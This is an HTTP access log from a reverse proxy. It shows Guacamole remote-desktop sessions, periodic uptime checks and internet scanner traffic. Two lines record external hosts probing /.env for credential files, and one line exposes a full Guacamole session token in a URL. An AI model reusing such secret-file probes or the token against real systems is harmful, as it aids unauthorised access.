129.55.200.20 - - [14/Dec/2023:21:06:22 +0000] "GET /guacamole/translations/en.json HTTP/2.0" 200 49963 "-" "-" 3353 "guacamole@docker" "http://172.25.0.9:8080" 3ms
159.203.109.206 - - [14/Dec/2023:21:06:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3354 "www@docker" "http://172.25.0.8:80" 0ms
129.55.200.20 - - [14/Dec/2023:21:06:34 +0000] "POST /guacamole/api/tokens HTTP/2.0" 403 261 "-" "-" 3355 "guacamole@docker" "http://172.25.0.9:8080" 186ms
167.71.120.76 - - [14/Dec/2023:21:06:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3356 "www@docker" "http://172.25.0.8:80" 0ms
129.55.200.20 - - [14/Dec/2023:21:06:41 +0000] "POST /guacamole/api/tokens HTTP/2.0" 200 171 "-" "-" 3357 "guacamole@docker" "http://172.25.0.9:8080" 31ms
129.55.200.20 - - [14/Dec/2023:21:06:41 +0000] "DELETE /guacamole/api/session HTTP/2.0" 403 192 "-" "-" 3359 "guacamole@docker" "http://172.25.0.9:8080" 4ms
129.55.200.20 - - [14/Dec/2023:21:06:41 +0000] "POST /guacamole/api/tokens HTTP/2.0" 200 171 "-" "-" 3358 "guacamole@docker" "http://172.25.0.9:8080" 4ms
129.55.200.20 - - [14/Dec/2023:21:06:41 +0000] "GET /guacamole/api/session/data/mysql-shared/self/effectivePermissions HTTP/2.0" 200 228 "-" "-" 3363 "guacamole@docker" "http://172.25.0.9:8080" 4ms
129.55.200.20 - - [14/Dec/2023:21:06:41 +0000] "GET /guacamole/api/session/data/mysql-shared/connectionGroups/ROOT/tree HTTP/2.0" 200 123 "-" "-" 3362 "guacamole@docker" "http://172.25.0.9:8080" 6ms
129.55.200.20 - - [14/Dec/2023:21:06:41 +0000] "GET /guacamole/api/session/data/mysql/connectionGroups/ROOT/tree HTTP/2.0" 200 1632 "-" "-" 3360 "guacamole@docker" "http://172.25.0.9:8080" 58ms
129.55.200.20 - - [14/Dec/2023:21:06:41 +0000] "GET /guacamole/api/session/data/mysql/self/effectivePermissions HTTP/2.0" 200 685 "-" "-" 3361 "guacamole@docker" "http://172.25.0.9:8080" 73ms
129.55.200.20 - - [14/Dec/2023:21:06:41 +0000] "GET /guacamole/api/session/data/mysql-shared/activeConnections HTTP/2.0" 200 2 "-" "-" 3365 "guacamole@docker" "http://172.25.0.9:8080" 5ms
129.55.200.20 - - [14/Dec/2023:21:06:41 +0000] "GET /guacamole/api/session/data/mysql/users/jonathan HTTP/2.0" 200 409 "-" "-" 3364 "guacamole@docker" "http://172.25.0.9:8080" 36ms
129.55.200.20 - - [14/Dec/2023:21:06:41 +0000] "GET /guacamole/api/session/data/mysql/activeConnections HTTP/2.0" 200 2 "-" "-" 3366 "guacamole@docker" "http://172.25.0.9:8080" 46ms
129.55.200.20 - - [14/Dec/2023:21:06:50 +0000] "POST /guacamole/api/tokens HTTP/2.0" 200 171 "-" "-" 3367 "guacamole@docker" "http://172.25.0.9:8080" 5ms
129.55.200.20 - - [14/Dec/2023:21:06:50 +0000] "GET /guacamole/api/session/data/mysql/connections/9 HTTP/2.0" 200 300 "-" "-" 3368 "guacamole@docker" "http://172.25.0.9:8080" 22ms
129.55.200.20 - - [14/Dec/2023:21:06:51 +0000] "GET /guacamole/api/session/tunnels/080e59f7-9964-315e-b276-c0ed869dca9d/protocol HTTP/2.0" 200 5172 "-" "-" 3370 "guacamole@docker" "http://172.25.0.9:8080" 5ms
129.55.200.20 - - [14/Dec/2023:21:06:51 +0000] "GET /guacamole/api/session/tunnels/080e59f7-9964-315e-b276-c0ed869dca9d/activeConnection/connection/sharingProfiles HTTP/2.0" 200 2 "-" "-" 3371 "guacamole@docker" "http://172.25.0.9:8080" 101ms
159.203.109.206 - - [14/Dec/2023:21:07:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3372 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:21:07:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3373 "www@docker" "http://172.25.0.8:80" 1ms
129.55.200.20 - - [14/Dec/2023:21:08:22 +0000] "GET /guacamole/ HTTP/2.0" 304 0 "-" "-" 3374 "guacamole@docker" "http://172.25.0.9:8080" 2ms
129.55.200.20 - - [14/Dec/2023:21:06:51 +0000] "GET /guacamole/websocket-tunnel?token=358C8346D924D3C0D4AB0C7E3F2DB99A7CF8A66D191427CD67F98595FC9768CF&GUAC_DATA_SOURCE=mysql&GUAC_ID=9&GUAC_TYPE=c&GUAC_WIDTH=2880&GUAC_HEIGHT=1666&GUAC_DPI=192&GUAC_TIMEZONE=America%2FNew_York&GUAC_AUDIO=audio%2FL8&GUAC_AUDIO=audio%2FL16&GUAC_IMAGE=image%2Fjpeg&GUAC_IMAGE=image%2Fpng&GUAC_IMAGE=image%2Fwebp HTTP/1.1" 0 0 "-" "-" 3369 "guacamole@docker" "http://172.25.0.9:8080" 91444ms
129.55.200.20 - - [14/Dec/2023:21:08:22 +0000] "GET /guacamole/app.css?b=20230726134908 HTTP/2.0" 304 0 "-" "-" 3375 "guacamole@docker" "http://172.25.0.9:8080" 2ms
129.55.200.20 - - [14/Dec/2023:21:08:22 +0000] "GET /guacamole/app.js?b=20230726134908 HTTP/2.0" 304 0 "-" "-" 3376 "guacamole@docker" "http://172.25.0.9:8080" 4ms
129.55.200.20 - - [14/Dec/2023:21:08:23 +0000] "GET /guacamole/api/patches HTTP/2.0" 200 340 "-" "-" 3377 "guacamole@docker" "http://172.25.0.9:8080" 5ms
129.55.200.20 - - [14/Dec/2023:21:08:23 +0000] "POST /guacamole/api/tokens HTTP/2.0" 200 171 "-" "-" 3379 "guacamole@docker" "http://172.25.0.9:8080" 5ms
129.55.200.20 - - [14/Dec/2023:21:08:23 +0000] "GET /guacamole/api/languages HTTP/2.0" 200 244 "-" "-" 3378 "guacamole@docker" "http://172.25.0.9:8080" 16ms
129.55.200.20 - - [14/Dec/2023:21:08:23 +0000] "GET /guacamole/translations/en.json HTTP/2.0" 200 49963 "-" "-" 3384 "guacamole@docker" "http://172.25.0.9:8080" 3ms
129.55.200.20 - - [14/Dec/2023:21:08:23 +0000] "GET /guacamole/api/session/data/mysql-shared/connectionGroups/ROOT/tree HTTP/2.0" 200 123 "-" "-" 3381 "guacamole@docker" "http://172.25.0.9:8080" 6ms
129.55.200.20 - - [14/Dec/2023:21:08:23 +0000] "GET /guacamole/api/session/data/mysql-shared/self/effectivePermissions HTTP/2.0" 200 228 "-" "-" 3383 "guacamole@docker" "http://172.25.0.9:8080" 7ms
129.55.200.20 - - [14/Dec/2023:21:08:23 +0000] "GET /guacamole/api/session/data/mysql/self/effectivePermissions HTTP/2.0" 200 685 "-" "-" 3382 "guacamole@docker" "http://172.25.0.9:8080" 59ms
129.55.200.20 - - [14/Dec/2023:21:08:23 +0000] "GET /guacamole/api/session/data/mysql/connectionGroups/ROOT/tree HTTP/2.0" 200 1632 "-" "-" 3380 "guacamole@docker" "http://172.25.0.9:8080" 75ms
129.55.200.20 - - [14/Dec/2023:21:08:23 +0000] "GET /guacamole/api/session/data/mysql-shared/activeConnections HTTP/2.0" 200 2 "-" "-" 3386 "guacamole@docker" "http://172.25.0.9:8080" 6ms
129.55.200.20 - - [14/Dec/2023:21:08:23 +0000] "GET /guacamole/api/session/data/mysql/users/jonathan HTTP/2.0" 200 409 "-" "-" 3385 "guacamole@docker" "http://172.25.0.9:8080" 48ms
129.55.200.20 - - [14/Dec/2023:21:08:23 +0000] "GET /guacamole/api/session/data/mysql/activeConnections HTTP/2.0" 200 2 "-" "-" 3387 "guacamole@docker" "http://172.25.0.9:8080" 60ms
159.203.109.206 - - [14/Dec/2023:21:08:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3388 "www@docker" "http://172.25.0.8:80" 1ms
129.55.200.20 - - [14/Dec/2023:21:08:26 +0000] "POST /guacamole/api/tokens HTTP/2.0" 200 171 "-" "-" 3389 "guacamole@docker" "http://172.25.0.9:8080" 5ms
129.55.200.20 - - [14/Dec/2023:21:08:26 +0000] "GET /guacamole/api/session/data/mysql/connections/9 HTTP/2.0" 200 300 "-" "-" 3390 "guacamole@docker" "http://172.25.0.9:8080" 20ms
129.55.200.20 - - [14/Dec/2023:21:08:27 +0000] "GET /guacamole/api/session/tunnels/48a8de6b-b7c5-3257-9aaf-fdab264890c2/protocol HTTP/2.0" 200 5172 "-" "-" 3392 "guacamole@docker" "http://172.25.0.9:8080" 5ms
129.55.200.20 - - [14/Dec/2023:21:08:27 +0000] "GET /guacamole/api/session/tunnels/48a8de6b-b7c5-3257-9aaf-fdab264890c2/activeConnection/connection/sharingProfiles HTTP/2.0" 200 2 "-" "-" 3393 "guacamole@docker" "http://172.25.0.9:8080" 84ms
167.71.120.76 - - [14/Dec/2023:21:08:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3394 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [14/Dec/2023:21:09:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3395 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:21:09:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3396 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [14/Dec/2023:21:10:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3397 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:21:10:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3398 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [14/Dec/2023:21:11:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3399 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [14/Dec/2023:21:11:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3400 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:21:12:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3401 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:21:12:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3402 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [14/Dec/2023:21:13:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3403 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:21:13:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3404 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:21:14:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3405 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:21:14:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3406 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:21:15:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3407 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:21:15:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3408 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [14/Dec/2023:21:16:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3409 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [14/Dec/2023:21:16:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3410 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:21:17:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3411 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:21:17:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3412 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [14/Dec/2023:21:18:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3413 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:21:18:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3414 "www@docker" "http://172.25.0.8:80" 0ms
143.110.222.166 - - [14/Dec/2023:21:18:42 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 3415 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [14/Dec/2023:21:19:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3416 "www@docker" "http://172.25.0.8:80" 0ms
129.55.200.20 - - [14/Dec/2023:21:19:31 +0000] "GET /guacamole/ HTTP/2.0" 304 0 "-" "-" 3417 "guacamole@docker" "http://172.25.0.9:8080" 2ms
129.55.200.20 - - [14/Dec/2023:21:19:31 +0000] "GET /guacamole/app.css?b=20230726134908 HTTP/2.0" 304 0 "-" "-" 3418 "guacamole@docker" "http://172.25.0.9:8080" 2ms
129.55.200.20 - - [14/Dec/2023:21:19:31 +0000] "GET /guacamole/app.js?b=20230726134908 HTTP/2.0" 304 0 "-" "-" 3419 "guacamole@docker" "http://172.25.0.9:8080" 2ms
129.55.200.20 - - [14/Dec/2023:21:19:32 +0000] "GET /guacamole/api/patches HTTP/2.0" 200 340 "-" "-" 3421 "guacamole@docker" "http://172.25.0.9:8080" 8ms
129.55.200.20 - - [14/Dec/2023:21:19:32 +0000] "GET /guacamole/api/languages HTTP/2.0" 200 244 "-" "-" 3420 "guacamole@docker" "http://172.25.0.9:8080" 14ms
129.55.200.20 - - [14/Dec/2023:21:19:32 +0000] "POST /guacamole/api/tokens HTTP/2.0" 200 171 "-" "-" 3422 "guacamole@docker" "http://172.25.0.9:8080" 8ms
129.55.200.20 - - [14/Dec/2023:21:19:32 +0000] "GET /guacamole/translations/en.json HTTP/2.0" 200 49963 "-" "-" 3423 "guacamole@docker" "http://172.25.0.9:8080" 2ms
129.55.200.20 - - [14/Dec/2023:21:19:32 +0000] "GET /guacamole/api/session/data/mysql-shared/connectionGroups/ROOT/tree HTTP/2.0" 200 123 "-" "-" 3425 "guacamole@docker" "http://172.25.0.9:8080" 7ms
129.55.200.20 - - [14/Dec/2023:21:19:32 +0000] "GET /guacamole/api/session/data/mysql-shared/self/effectivePermissions HTTP/2.0" 200 228 "-" "-" 3427 "guacamole@docker" "http://172.25.0.9:8080" 4ms
129.55.200.20 - - [14/Dec/2023:21:19:32 +0000] "GET /guacamole/api/session/data/mysql/connectionGroups/ROOT/tree HTTP/2.0" 200 1632 "-" "-" 3424 "guacamole@docker" "http://172.25.0.9:8080" 57ms
129.55.200.20 - - [14/Dec/2023:21:19:32 +0000] "GET /guacamole/api/session/data/mysql/self/effectivePermissions HTTP/2.0" 200 741 "-" "-" 3426 "guacamole@docker" "http://172.25.0.9:8080" 64ms
129.55.200.20 - - [14/Dec/2023:21:19:32 +0000] "GET /guacamole/api/session/data/mysql-shared/activeConnections HTTP/2.0" 200 2 "-" "-" 3428 "guacamole@docker" "http://172.25.0.9:8080" 4ms
129.55.200.20 - - [14/Dec/2023:21:19:32 +0000] "GET /guacamole/api/session/data/mysql/users/jonathan HTTP/2.0" 200 409 "-" "-" 3430 "guacamole@docker" "http://172.25.0.9:8080" 41ms
129.55.200.20 - - [14/Dec/2023:21:19:32 +0000] "GET /guacamole/api/session/data/mysql/activeConnections HTTP/2.0" 200 214 "-" "-" 3429 "guacamole@docker" "http://172.25.0.9:8080" 47ms
129.55.200.20 - - [14/Dec/2023:21:19:33 +0000] "POST /guacamole/api/tokens HTTP/2.0" 200 171 "-" "-" 3431 "guacamole@docker" "http://172.25.0.9:8080" 4ms
129.55.200.20 - - [14/Dec/2023:21:19:33 +0000] "GET /guacamole/api/session/data/mysql/connections/5 HTTP/2.0" 200 296 "-" "-" 3432 "guacamole@docker" "http://172.25.0.9:8080" 17ms
129.55.200.20 - - [14/Dec/2023:21:19:34 +0000] "GET /guacamole/api/session/tunnels/cbf92430-56b8-3306-99ef-796b47a799ea/protocol HTTP/2.0" 200 2512 "-" "-" 3434 "guacamole@docker" "http://172.25.0.9:8080" 4ms
129.55.200.20 - - [14/Dec/2023:21:19:34 +0000] "GET /guacamole/api/session/tunnels/cbf92430-56b8-3306-99ef-796b47a799ea/activeConnection/connection/sharingProfiles HTTP/2.0" 200 2 "-" "-" 3435 "guacamole@docker" "http://172.25.0.9:8080" 64ms
167.71.120.76 - - [14/Dec/2023:21:19:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3436 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [14/Dec/2023:21:20:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3437 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:21:20:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3438 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:21:21:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3439 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [14/Dec/2023:21:21:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3440 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [14/Dec/2023:21:22:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3441 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [14/Dec/2023:21:22:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3442 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [14/Dec/2023:21:23:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3443 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [14/Dec/2023:21:23:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3444 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:21:24:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3445 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [14/Dec/2023:21:24:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3446 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:21:25:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3447 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [14/Dec/2023:21:25:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3448 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:21:26:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3449 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [14/Dec/2023:21:26:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3450 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [14/Dec/2023:21:27:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3451 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:21:27:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3452 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [14/Dec/2023:21:28:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3453 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:21:28:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3454 "www@docker" "http://172.25.0.8:80" 1ms
152.32.149.19 - - [14/Dec/2023:21:28:44 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 3455 "-" "-" 0ms
152.32.149.19 - - [14/Dec/2023:21:29:02 +0000] "GET /favicon.ico HTTP/1.1" 404 19 "-" "-" 3456 "-" "-" 0ms
152.32.149.19 - - [14/Dec/2023:21:29:02 +0000] "GET /robots.txt HTTP/1.1" 404 19 "-" "-" 3457 "-" "-" 0ms
152.32.149.19 - - [14/Dec/2023:21:29:02 +0000] "GET /sitemap.xml HTTP/1.1" 404 19 "-" "-" 3458 "-" "-" 0ms
159.203.109.206 - - [14/Dec/2023:21:29:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3459 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:21:29:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3460 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [14/Dec/2023:21:30:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3461 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [14/Dec/2023:21:30:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3462 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [14/Dec/2023:21:31:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3463 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:21:31:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3464 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [14/Dec/2023:21:32:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3465 "www@docker" "http://172.25.0.8:80" 1ms
192.241.215.48 - - [14/Dec/2023:21:32:36 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 3466 "-" "-" 0ms
167.71.120.76 - - [14/Dec/2023:21:32:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3467 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [14/Dec/2023:21:33:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3468 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [14/Dec/2023:21:33:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3469 "www@docker" "http://172.25.0.8:80" 1ms
192.241.222.92 - - [14/Dec/2023:21:34:05 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 3470 "-" "-" 0ms
159.203.109.206 - - [14/Dec/2023:21:34:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3471 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:21:34:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3472 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:21:35:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3473 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [14/Dec/2023:21:35:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3474 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [14/Dec/2023:21:36:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3475 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [14/Dec/2023:21:36:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3476 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:21:37:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3477 "www@docker" "http://172.25.0.8:80" 1ms
205.210.31.65 - - [14/Dec/2023:21:37:37 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 3478 "-" "-" 0ms
167.71.120.76 - - [14/Dec/2023:21:37:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3479 "www@docker" "http://172.25.0.8:80" 0ms
63.250.58.63 - - [14/Dec/2023:21:38:23 +0000] "GET /.env HTTP/1.1" 301 17 "-" "-" 3480 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [14/Dec/2023:21:38:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3481 "www@docker" "http://172.25.0.8:80" 0ms
149.18.84.38 - - [14/Dec/2023:21:38:31 +0000] "GET /.env HTTP/1.1" 301 17 "-" "-" 3482 "web-to-websecure@internal" "-" 0ms
167.71.120.76 - - [14/Dec/2023:21:38:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3483 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:21:39:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3484 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [14/Dec/2023:21:39:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3485 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:21:40:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3486 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [14/Dec/2023:21:40:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3487 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [14/Dec/2023:21:41:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3488 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:21:41:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3489 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [14/Dec/2023:21:42:24 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3490 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:21:42:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3491 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:21:43:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3492 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:21:43:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3493 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [14/Dec/2023:21:44:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3494 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:21:44:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3495 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:21:45:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3496 "www@docker" "http://172.25.0.8:80" 1ms
43.130.11.228 - - [14/Dec/2023:21:45:32 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 3497 "-" "-" 0ms
167.71.120.76 - - [14/Dec/2023:21:45:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3498 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [14/Dec/2023:21:46:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3499 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [14/Dec/2023:21:46:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3500 "www@docker" "http://172.25.0.8:80" 1ms
146.70.192.180 - - [14/Dec/2023:21:46:44 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 3501 "-" "-" 0ms
111.7.96.178 - - [14/Dec/2023:21:46:47 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 3502 "-" "-" 0ms
159.203.109.206 - - [14/Dec/2023:21:47:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3503 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [14/Dec/2023:21:47:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3504 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:21:48:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3505 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:21:48:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3506 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [14/Dec/2023:21:49:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3507 "www@docker" "http://172.25.0.8:80" 0ms
167.71.120.76 - - [14/Dec/2023:21:49:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3508 "www@docker" "http://172.25.0.8:80" 0ms
159.203.109.206 - - [14/Dec/2023:21:50:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3509 "www@docker" "http://172.25.0.8:80" 1ms
167.71.120.76 - - [14/Dec/2023:21:50:38 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3510 "www@docker" "http://172.25.0.8:80" 1ms
129.55.200.20 - - [14/Dec/2023:21:51:18 +0000] "GET /trace HTTP/2.0" 200 758 "-" "-" 3511 "livetrace@docker" "http://172.25.0.5:80" 36ms
129.55.200.20 - - [14/Dec/2023:21:51:18 +0000] "GET /script.js HTTP/2.0" 404 555 "-" "-" 3512 "www@docker" "http://172.25.0.8:80" 1ms
129.55.200.20 - - [14/Dec/2023:21:51:18 +0000] "GET /favicon.ico HTTP/2.0" 404 555 "-" "-" 3513 "www@docker" "http://172.25.0.8:80" 0ms
129.55.200.20 - - [14/Dec/2023:21:51:22 +0000] "GET /trace HTTP/2.0" 200 758 "-" "-" 3514 "livetrace@docker" "http://172.25.0.5:80" 4ms
129.55.200.20 - - [14/Dec/2023:21:51:22 +0000] "GET /script.js HTTP/2.0" 404 555 "-" "-" 3515 "www@docker" "http://172.25.0.8:80" 1ms
159.203.109.206 - - [14/Dec/2023:21:51:23 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 3516 "www@docker" "http://172.25.0.8:80" 0ms
129.55.200.20 - - [14/Dec/2023:21:51:24 +0000] "GET /trace HTTP/2.0" 200 758 "-" "-" 3517 "livetrace@docker" "http://172.25.0.5:80" 4ms
129.55.200.20 - - [14/Dec/2023:21:51:24 +0000] "GET /script.js HTTP/2.0" 404 555 "-" "-" 3518 "www@docker" "http://172.25.0.8:80" 1ms
